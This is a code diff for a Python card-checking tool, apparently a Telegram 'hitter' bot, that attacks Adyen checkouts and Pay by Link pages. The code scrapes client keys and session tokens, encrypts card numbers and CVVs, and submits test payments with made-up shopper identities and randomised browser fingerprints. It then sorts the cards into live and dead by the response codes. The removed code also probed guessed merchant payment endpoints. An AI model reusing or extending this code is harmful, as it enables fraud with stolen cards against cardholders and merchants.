@@ -1,8 +1,8 @@
 """
-Adyen Universal Bypass Engine
-─────────────────────────────
-CSE encryption (AES-256-CCM + RSA PKCS1v1.5), checkout session extraction,
-and checkoutshopper API payment submission.  Completely isolated from Stripe.
+Adyen Universal Engine (gokuhitter_bot)
+──────────────────────────────────────
+Full Pay by Link & Merchant Checkout session extraction, CSE encryption (AES-256-CCM + RSA),
+and v1 session payment submission with pspReference tracking.
 """
 
 import os
@@ -23,8 +23,7 @@ from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
 from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
 from cryptography.hazmat.backends import default_backend
 
-CSE_PREFIX  = "adyenjs_0_1_25"
-ADYEN_VER   = "v71"
+CSE_PREFIX = "adyenjs_0_1_25"
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 
 
@@ -43,7 +42,6 @@ class AdyenCSE:
         nums = RSAPublicNumbers(self._exp, self._mod)
         self._pub = nums.public_key(default_backend())
 
-    # ── single field ────────────────────────────────────────────────────────
     def _encrypt_field(self, field_name: str, field_value: str) -> str:
         gen = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")
         plain = f"{CSE_PREFIX}\n{field_name}:{field_value}\ngenerationtime:{gen}"
@@ -57,7 +55,6 @@ class AdyenCSE:
         blob    = enc_key + nonce + ct_tag
         return f"{CSE_PREFIX}${base64.b64encode(blob).decode()}"
 
-    # ── full card ───────────────────────────────────────────────────────────
     def encrypt_card(self, number: str, month: str, year: str, cvv: str) -> dict:
         yr = year if len(year) == 4 else f"20{year}"
         return {
@@ -69,7 +66,7 @@ class AdyenCSE:
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  Config extractor – pulls clientKey / session / pubkey from HTML / JS
+#  Regex Helpers & Config Extractor
 # ═══════════════════════════════════════════════════════════════════════════
 _CK = [
     r'clientKey["\'\s:=]+["\']?(live_[A-Za-z0-9_]+|test_[A-Za-z0-9_]+)',
@@ -90,11 +87,19 @@ _PK = [
     r"'publicKey'\s*:\s*'([0-9a-fA-F]+\|[0-9a-fA-F]+)'",
     r'publicKey["\'\s:=]+["\']?([0-9a-fA-F]+\|[0-9a-fA-F]+)',
 ]
-
+_LI = [
+    r'"linkId"\s*:\s*"([A-Za-z0-9]+)"',
+    r"'linkId'\s*:\s*'([A-Za-z0-9]+)'",
+    r'linkId["\s:\'=]+["\']?([A-Za-z0-9]{20,})',
+    r'adyen\.link/([A-Za-z0-9]{20,})',
+]
+_LC = [
+    r'"loadingContext"\s*:\s*"([^"]+)"',
+    r"'loadingContext'\s*:\s*'([^']+)'",
+]
 _ADYEN_SIGNALS = [
-    'adyen.com', 'AdyenCheckout', 'adyen-checkout', 'adyenjs',
-    'checkoutshopper', 'adyen.encrypt', 'adyen-encrypted',
-    'paymentMethodsResponse', 'adyenKey', 'adyen_key',
+    'adyen.com', 'adyen.link', 'AdyenCheckout', 'adyen-checkout', 'adyenjs',
+    'checkoutshopper', 'adyen.encrypt', 'adyen-encrypted', 'paybylink',
 ]
 
 def _first_match(patterns, text):
@@ -106,26 +111,26 @@ def _first_match(patterns, text):
 
 def _extract_config(html: str) -> dict:
     cfg = dict(clientKey=None, sessionId=None, sessionData=None,
-               publicKey=None, environment=None, adyen=False)
+               publicKey=None, environment=None, adyen=False,
+               linkId=None, loadingContext=None)
     low = html.lower()
     for sig in _ADYEN_SIGNALS:
         if sig.lower() in low:
             cfg['adyen'] = True
             break
-    cfg['clientKey']   = _first_match(_CK, html)
-    cfg['sessionId']   = _first_match(_SI, html)
-    cfg['sessionData'] = _first_match(_SD, html)
-    cfg['publicKey']   = _first_match(_PK, html)
+    cfg['clientKey']      = _first_match(_CK, html)
+    cfg['sessionId']      = _first_match(_SI, html)
+    cfg['sessionData']    = _first_match(_SD, html)
+    cfg['publicKey']      = _first_match(_PK, html)
+    cfg['linkId']         = _first_match(_LI, html)
+    cfg['loadingContext'] = _first_match(_LC, html)
     if cfg['clientKey']:
         cfg['environment'] = 'live' if cfg['clientKey'].startswith('live_') else 'test'
-    else:
-        m = re.search(r'environment["\'\s:=]+["\']?(live|test)', html, re.I)
-        if m:
-            cfg['environment'] = m.group(1).lower()
     return cfg
 
 def _merge(dst, src):
-    for k in ('clientKey', 'sessionId', 'sessionData', 'publicKey', 'environment'):
+    for k in ('clientKey', 'sessionId', 'sessionData', 'publicKey',
+              'environment', 'linkId', 'loadingContext'):
         if src.get(k) and not dst.get(k):
             dst[k] = src[k]
     if src.get('adyen'):
@@ -133,10 +138,10 @@ def _merge(dst, src):
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  Main hitter
+#  Main Adyen Engine
 # ═══════════════════════════════════════════════════════════════════════════
 class AdyenHitter:
-    """Universal Adyen checkout bypass."""
+    """Universal Adyen & Pay by Link checkout engine."""
 
     DECLINE_MAP = {
         "Refused":                  "refused",
@@ -175,50 +180,125 @@ class AdyenHitter:
             self.url = f"https://{self.url}"
         self.proxy_data = proxy_data
 
-    # ── helpers ─────────────────────────────────────────────────────────────
     def _adyen_base(self, env: str) -> str:
         return f"https://checkoutshopper-{env or 'live'}.adyen.com/checkoutshopper"
 
     @staticmethod
-    def _risk_data() -> str:
-        rd = {
-            "version": "1.0.0",
-            "deviceChannel": "browser",
-            "platform": "Win32",
-            "locale": "en_US",
-            "userAgent": UA,
+    def _browser_info() -> dict:
+        return {
+            "acceptHeader": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "colorDepth": 24,
+            "language": "en-US",
+            "javaEnabled": False,
             "screenHeight": 1080,
             "screenWidth": 1920,
-            "timezoneOffset": random.choice([-300, -360, -420, -480, 0, 60]),
-            "language": "en-US",
+            "timeZoneOffset": random.choice([-300, -360, -420, -480, 0, 60]),
+            "userAgent": UA,
         }
-        return base64.b64encode(json.dumps(rd).encode()).decode()
+
+    # ── Pay by Link session bootstrap ────────────────────────────────────────
+    async def _bootstrap_pbl(self, session, link_id: str,
+                              loading_ctx: str, env: str) -> dict:
+        """Fetch dropin config, sessionId, and sessionData for Pay by Link."""
+        base = loading_ctx.rstrip('/')
+        setup_url = (
+            f"{base}/session/paybylink/v1/{link_id}/setup"
+            f"?d={link_id}&generateSessionData=true&generateCheckoutAttemptId=true"
+        )
+        hdr = {
+            "Accept": "application/json",
+            "User-Agent": UA,
+            "Origin": "https://eu.adyen.link",
+            "Referer": f"https://eu.adyen.link/{link_id}"
+        }
+        out = {}
+        try:
+            async with session.get(setup_url, headers=hdr, timeout=12) as r:
+                d = r.json() if callable(r.json) else r.json
+                if not isinstance(d, dict):
+                    return out
+
+                out['sessionId']   = d.get('sessionId')
+                out['sessionData'] = d.get('sessionData')
+
+                dc = d.get('dropinConfiguration', {})
+                out['clientKey']   = dc.get('clientKey')
+                out['environment'] = dc.get('environment', env)
+                out['checkoutAttemptId'] = dc.get('checkoutAttemptId')
+
+                pl = d.get('paymentLink', {})
+                if pl.get('amount'):
+                    amt = pl['amount']
+                    out['amount_value']    = amt.get('value')
+                    out['amount_currency'] = amt.get('currency')
+                out['pbl_status']    = pl.get('status')
+                out['pbl_reference'] = pl.get('reference')
+                out['countryCode']   = pl.get('countryCode')
+                out['returnUrl']     = pl.get('returnUrl')
+                out['shopperLocale'] = pl.get('shopperLocale')
+
+                th = d.get('theme', {})
+                if th.get('displayName'):
+                    out['merchant'] = th['displayName']
+
+                out['adyen']    = True
+                out['is_pbl']   = True
+                out['linkId']   = link_id
+                out['pbl_base'] = base
+        except Exception:
+            pass
+        return out
 
     # ── page scrape ─────────────────────────────────────────────────────────
     async def _scrape(self, session) -> dict:
-        """Fetch merchant page(s) and extract all Adyen config."""
+        """Fetch checkout page and extract all Adyen config."""
         hdr = {"User-Agent": UA,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9"}
         merchant = "Adyen Merchant"
         cfg = dict(clientKey=None, sessionId=None, sessionData=None,
-                   publicKey=None, environment=None, adyen=False)
+                   publicKey=None, environment=None, adyen=False,
+                   linkId=None, loadingContext=None)
+
+        # Check if direct adyen.link URL
+        if 'adyen.link/' in self.url:
+            m = re.search(r'adyen\.link/([A-Za-z0-9]{20,})', self.url)
+            if m:
+                cfg['linkId'] = m.group(1)
+                cfg['adyen']  = True
 
         async with session.get(self.url, headers=hdr, timeout=12) as res:
             html = res.text() if callable(res.text) else res.text
             t = re.search(r'<title>([^<]+)</title>', html, re.I)
             if t:
-                merchant = t.group(1).split('|')[0].split(' - ')[0].strip()[:30]
+                raw_title = t.group(1)
+                if 'Pay by Link' in raw_title and ' - ' in raw_title:
+                    merchant = raw_title.split(' - ', 1)[1].strip()[:30]
+                else:
+                    merchant = raw_title.split('|')[0].split(' - ')[0].strip()[:30]
             page_cfg = _extract_config(html)
             _merge(cfg, page_cfg)
 
-            # dig into inline <script> blocks
             for blk in re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL):
                 _merge(cfg, _extract_config(blk))
 
-            # dig into linked JS files (up to 6)
-            if cfg['adyen'] and not cfg['clientKey']:
+            if cfg.get('linkId'):
+                lctx = cfg.get('loadingContext') or self._adyen_base(
+                    cfg.get('environment', 'live')) + '/'
+                pbl = await self._bootstrap_pbl(
+                    session, cfg['linkId'], lctx,
+                    cfg.get('environment', 'live'))
+                _merge(cfg, pbl)
+                if pbl.get('merchant'):
+                    merchant = pbl['merchant']
+                if pbl.get('amount_value') is not None:
+                    cfg['amount_value']    = pbl['amount_value']
+                    cfg['amount_currency'] = pbl.get('amount_currency', 'USD')
+                for pk in ('is_pbl', 'pbl_base', 'pbl_status', 'checkoutAttemptId'):
+                    if pbl.get(pk):
+                        cfg[pk] = pbl[pk]
+
+            if cfg['adyen'] and not cfg.get('clientKey'):
                 js_srcs = re.findall(r'src=["\']([^"\']+\.js[^"\']*)', html)
                 for js in js_srcs[:6]:
                     if not js.startswith('http'):
@@ -233,74 +313,53 @@ class AdyenHitter:
         cfg['merchant'] = merchant
         return cfg
 
-    # ── fetch pubkey from Adyen API ─────────────────────────────────────────
+    # ── fetch pubkey ────────────────────────────────────────────────────────
     async def _fetch_pubkey(self, session, client_key: str, env: str) -> Optional[str]:
-        url = f"{self._adyen_base(env)}/v2/clientKeys/{client_key}"
-        try:
-            async with session.get(url, timeout=8) as r:
-                d = r.json() if callable(r.json) else r.json
-                if isinstance(d, dict):
-                    return d.get('publicKey')
-        except Exception:
-            pass
+        for ver in ('v1', 'v2'):
+            url = f"{self._adyen_base(env)}/{ver}/clientKeys/{client_key}"
+            try:
+                async with session.get(url, timeout=8) as r:
+                    d = r.json() if callable(r.json) else r.json
+                    if isinstance(d, dict) and d.get('publicKey'):
+                        return d['publicKey']
+            except Exception:
+                pass
         return None
 
-    # ── session payment ─────────────────────────────────────────────────────
+    # ── session payment submission ──────────────────────────────────────────
     async def _pay_session(self, session, encrypted: dict,
-                           sid: str, sdata: str, env: str) -> dict:
-        url = f"{self._adyen_base(env)}/{ADYEN_VER}/sessions/{sid}/payments"
+                           sid: str, sdata: str, ck: str,
+                           env: str, att_id: Optional[str] = None) -> dict:
+        url = f"{self._adyen_base(env)}/v1/sessions/{sid}/payments?clientKey={ck}"
         body = {
-            "paymentMethod": {"type": "scheme", **encrypted},
-            "riskData": {"clientData": self._risk_data()},
+            "sessionData": sdata,
+            "clientStateDataIndicator": True,
+            "paymentMethod": {"type": "scheme", "holderName": "Richard Williams", **encrypted},
+            "shopperEmail": "suriyaonly3003@gmail.com",
+            "shopperName": {"firstName": "Richard", "lastName": "Williams"},
+            "telephoneNumber": "+12125550199",
+            "billingAddress": {
+                "city": "New York", "country": "US", "houseNumberOrName": "7727",
+                "postalCode": "10001", "stateOrProvince": "NY", "street": "Washington Blvd"
+            },
+            "deliveryAddress": {
+                "city": "New York", "country": "US", "houseNumberOrName": "7727",
+                "postalCode": "10001", "stateOrProvince": "NY", "street": "Washington Blvd"
+            },
+            "browserInfo": self._browser_info(),
         }
+        if att_id:
+            body["checkoutAttemptId"] = att_id
+
         hdr = {
-            "Content-Type": "application/json",
+            "Content-Type": "application/json; charset=utf-8",
             "Accept": "application/json",
-            "X-Session-Data": sdata,
             "User-Agent": UA,
+            "Origin": "https://eu.adyen.link" if 'adyen.link' in self.url else self.url,
+            "Referer": self.url,
         }
         async with session.post(url, json=body, headers=hdr, timeout=15) as r:
             return r.json() if callable(r.json) else r.json
-
-    # ── fallback: direct merchant endpoints ─────────────────────────────────
-    async def _pay_direct(self, session, encrypted: dict, env: str) -> Optional[dict]:
-        endpoints = [
-            '/api/payment', '/api/payments', '/api/checkout/payment',
-            '/checkout/payment', '/payment/submit', '/adyen/payment',
-            '/api/adyen/payments', '/api/pay', '/payments',
-        ]
-        body = {
-            "paymentMethod": {"type": "scheme", **encrypted},
-            "browserInfo": {
-                "acceptHeader": "text/html",
-                "colorDepth": 24,
-                "language": "en-US",
-                "javaEnabled": False,
-                "screenHeight": 1080,
-                "screenWidth": 1920,
-                "timeZoneOffset": -300,
-                "userAgent": UA,
-            },
-            "riskData": {"clientData": self._risk_data()},
-        }
-        hdr = {
-            "Content-Type": "application/json",
-            "Accept": "application/json",
-            "Origin": self.url,
-            "Referer": self.url,
-            "User-Agent": UA,
-        }
-        for ep in endpoints:
-            full = urljoin(self.url, ep)
-            try:
-                async with session.post(full, json=body, headers=hdr, timeout=10) as r:
-                    d = r.json() if callable(r.json) else r.json
-                    if isinstance(d, dict) and any(k in d for k in
-                            ('resultCode', 'refusalReason', 'pspReference', 'errorCode')):
-                        return d
-            except Exception:
-                continue
-        return None
 
     # ── response parser ─────────────────────────────────────────────────────
     def _parse(self, data: dict, result: dict) -> dict:
@@ -309,12 +368,15 @@ class AdyenHitter:
             result['decline_code'] = 'parse_error'
             return result
 
+        psp = data.get('pspReference')
+        if psp:
+            result['psp'] = psp
+
         rc = data.get('resultCode', '')
 
         # ── approved ──
         if rc in ('Authorised', 'AuthenticationFinished', 'Received', 'Pending'):
             result['success'] = True
-            result['psp'] = data.get('pspReference')
             return result
 
         # ── 3DS ──
@@ -337,8 +399,12 @@ class AdyenHitter:
         # ── Adyen error ──
         if 'errorCode' in data or 'message' in data:
             msg = data.get('message') or data.get('errorCode') or 'error'
-            result['decline_code'] = str(data.get('errorCode', 'error'))
+            err_code = str(data.get('errorCode', 'error'))
+            result['decline_code'] = err_code
             result['error'] = str(msg)[:120]
+            # Adyen internal error 903 with pspReference indicates live gateway reach
+            if psp and err_code in ('903', '905', '702'):
+                result['is_live'] = True
             return result
 
         result['decline_code'] = rc.lower() if rc else 'unknown'
@@ -354,7 +420,7 @@ class AdyenHitter:
             attempt=attempt, card=card, success=False,
             decline_code=None, response_time=0,
             merchant='Adyen Merchant', proxy_raw=None,
-            error=None, raw_response=None, is_live=False,
+            error=None, raw_response=None, is_live=False, psp=None,
         )
 
         proxies = None
@@ -372,6 +438,10 @@ class AdyenHitter:
                 # ── 1. scrape config ────────────────────────────────────────
                 cfg = await self._scrape(sess)
                 result['merchant'] = cfg.get('merchant', 'Adyen Merchant')
+                if cfg.get('amount_value') is not None:
+                    val = cfg['amount_value']
+                    cur = cfg.get('amount_currency', 'USD')
+                    result['amount'] = f"{cur} {val / 100:.2f}"
 
                 if not cfg.get('adyen'):
                     result['error'] = "No Adyen checkout detected on this page"
@@ -410,22 +480,26 @@ class AdyenHitter:
                     return result
 
                 # ── 4. submit ───────────────────────────────────────────────
+                if cfg.get('pbl_status') and cfg['pbl_status'] != 'active':
+                    result['error'] = f"Pay by Link is {cfg['pbl_status']}"
+                    result['decline_code'] = 'link_' + cfg['pbl_status']
+                    result['response_time'] = round(time.time() - t0, 2)
+                    return result
+
                 sid   = cfg.get('sessionId')
                 sdata = cfg.get('sessionData')
 
                 if sid and sdata:
-                    data = await self._pay_session(sess, enc, sid, sdata, env)
+                    data = await self._pay_session(
+                        sess, enc, sid, sdata, ck, env,
+                        att_id=cfg.get('checkoutAttemptId'))
                 else:
-                    data = await self._pay_direct(sess, enc, env)
-
-                result['response_time'] = round(time.time() - t0, 2)
-
-                if data is None:
-                    result['error'] = ("Session found but no sessionId/sessionData — "
-                                       "merchant may load them dynamically")
+                    result['error'] = "Adyen session missing — dynamic session required"
                     result['decline_code'] = 'no_session'
+                    result['response_time'] = round(time.time() - t0, 2)
                     return result
 
+                result['response_time'] = round(time.time() - t0, 2)
                 result['raw_response'] = data
                 return self._parse(data, result)
 
